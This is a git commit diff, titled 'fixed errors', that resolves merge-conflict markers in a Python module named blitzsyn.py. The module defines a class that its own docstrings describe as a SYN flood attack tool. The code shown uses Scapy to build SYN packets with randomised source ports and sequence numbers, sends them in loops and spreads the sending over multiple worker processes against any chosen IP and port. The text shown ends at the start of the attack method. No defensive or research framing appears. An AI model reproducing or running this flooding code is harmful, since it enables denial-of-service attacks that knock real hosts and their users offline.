c49e1bf56c6171c985a3733d0a372d11d65a7de8
Rskladanek <remek.skladanek@wp.pl>
2024-12-07 23:27:14 +0100

    fixed errors

--- modules/blitzsyn.py
+++ modules/blitzsyn.py
@@ -4,7 +4,6 @@ import random
 
 class BlitzSyn:
     """
-<<<<<<< HEAD
     This class implements a SYN flood attack. It sends a large number of SYN packets to a specified target IP and port
     using multiple processes to increase the speed and efficiency of the attack.
     """
@@ -14,64 +13,35 @@ class BlitzSyn:
 
         :param target_ip: The IP address of the target machine.
         :param target_port: The port number of the target machine.
-=======
-    There are going to be some comments
-    """
-    def __init__(self, target_ip, target_port):
-        """
-        There are going to be some comments
->>>>>>> origin/main
         """
         self.target_ip = target_ip
         self.target_port = target_port
 
-<<<<<<< HEAD
 
     def _send_syn_packet(self):
         """
         Constructs and sends a single SYN packet to the target IP and port.
         Randomizes the source port and sequence number to simulate different sessions.
-=======
-    def _send_syn_packet(self):
-        """
-        There are going to be some comments
->>>>>>> origin/main
         """
         ip_layer = IP(dst=self.target_ip)
         tcp_layer = TCP(sport=random.randint(1024, 65535), dport=self.target_port, flags='S', seq=random.randint(0, 4294967295))
         packet = ip_layer / tcp_layer
         send(packet, verbose=False)
 
-<<<<<<< HEAD
 
     def _worker(self, packets):
         """
         Sends a specified number of SYN packets in a single process.
 
         :param packets: The number of SYN packets to send.
-=======
-    def _worker(self, packets):
-        """
-        There are going to be some comments
->>>>>>> origin/main
         """
         for _ in range(packets):
             self._send_syn_packet()
 
-<<<<<<< HEAD
 
     def attack(self, workers=10, packets_per_worker=100):
-        """
-        Executes the SYN flood attack using multiple worker processes.
-
-        :param workers: The number of parallel worker processes to spawn.
-        :param packets_per_worker: The number of SYN packets each worker process will send.
-=======
-    def attack(self, workers=10, packets_per_worker=100):
-
         """
         There are going to be some comments
->>>>>>> origin/main
         """
         print(f"Starting SYN flood attack on {self.target_ip}:{self.target_port} with {workers} workers.")
         processes = []
